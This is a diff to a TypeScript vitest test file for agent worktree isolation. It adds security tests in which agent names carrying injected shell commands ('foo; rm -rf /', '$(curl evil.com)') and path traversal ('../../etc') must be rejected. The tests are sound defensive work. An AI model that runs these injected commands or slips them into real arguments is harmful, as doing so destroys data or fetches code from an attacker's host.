@@ -10,7 +10,7 @@ import { describe, it, expect, afterEach } from "vitest";
 import { NoIsolation } from "../src/builtin/isolation/no-isolation.js";
 import { WorktreeIsolation } from "../src/builtin/isolation/worktree-isolation.js";
 import { execSync } from "child_process";
-import { existsSync, mkdtempSync, rmSync, writeFileSync } from "fs";
+import { existsSync, mkdirSync, mkdtempSync, readdirSync, rmSync, writeFileSync } from "fs";
 import { join } from "path";
 import { tmpdir } from "os";
 
@@ -28,9 +28,10 @@ describe("NoIsolation", () => {
     expect(iso.getWorkDir("backend")).toBe(process.cwd());
   });
 
-  it("finalize does nothing", async () => {
+  it("finalize returns success", async () => {
     const iso = new NoIsolation();
-    await expect(iso.finalize("backend")).resolves.toBeUndefined();
+    const result = await iso.finalize("backend");
+    expect(result.success).toBe(true);
   });
 
   it("cleanup does nothing", async () => {
@@ -175,6 +176,66 @@ describe("WorktreeIsolation", () => {
       writeFileSync(join(d1, "api.ts"), "backend code");
       expect(existsSync(join(d1, "api.ts"))).toBe(true);
       expect(existsSync(join(d2, "api.ts"))).toBe(false);
+    } finally {
+      process.chdir(orig);
+    }
+  });
+
+  // ── Security tests ──────────────────────────────────────────────
+
+  it("rejects agent names with shell metacharacters", async () => {
+    const repo = makeGitRepo();
+    const orig = process.cwd();
+    process.chdir(repo);
+    try {
+      const iso = new WorktreeIsolation();
+      await expect(iso.prepare("foo; rm -rf /")).rejects.toThrow("Invalid agent name");
+      await expect(iso.prepare("$(curl evil.com)")).rejects.toThrow("Invalid agent name");
+      await expect(iso.prepare("`rm`"))
+        .rejects.toThrow("Invalid agent name");
+    } finally {
+      process.chdir(orig);
+    }
+  });
+
+  it("rejects path traversal in agent name", async () => {
+    const repo = makeGitRepo();
+    const orig = process.cwd();
+    process.chdir(repo);
+    try {
+      const iso = new WorktreeIsolation();
+      expect(() => iso.getWorkDir("../../etc")).toThrow("escapes worktree base");
+      expect(() => iso.getWorkDir("../..")).toThrow("escapes worktree base");
+    } finally {
+      process.chdir(orig);
+    }
+  });
+
+  it("finalize returns success status", async () => {
+    const repo = makeGitRepo();
+    const orig = process.cwd();
+    process.chdir(repo);
+    try {
+      const iso = new WorktreeIsolation();
+      const dir = await iso.prepare("backend");
+      const result = await iso.finalize("backend");
+      expect(result.success).toBe(true);
+    } finally {
+      process.chdir(orig);
+    }
+  });
+
+  it("cleanupStale removes orphan directories", async () => {
+    const repo = makeGitRepo();
+    const orig = process.cwd();
+    process.chdir(repo);
+    try {
+      const iso = new WorktreeIsolation();
+      // Create an orphan dir manually
+      mkdirSync(join(repo, ".pipal-a2a", "worktrees", "orphan"), { recursive: true });
+      await iso.cleanupStale();
+      // Orphan should be removed
+      expect(existsSync(join(repo, ".pipal-a2a", "worktrees", "orphan"))).toBe(false);
     } finally {
       process.chdir(orig);
     }
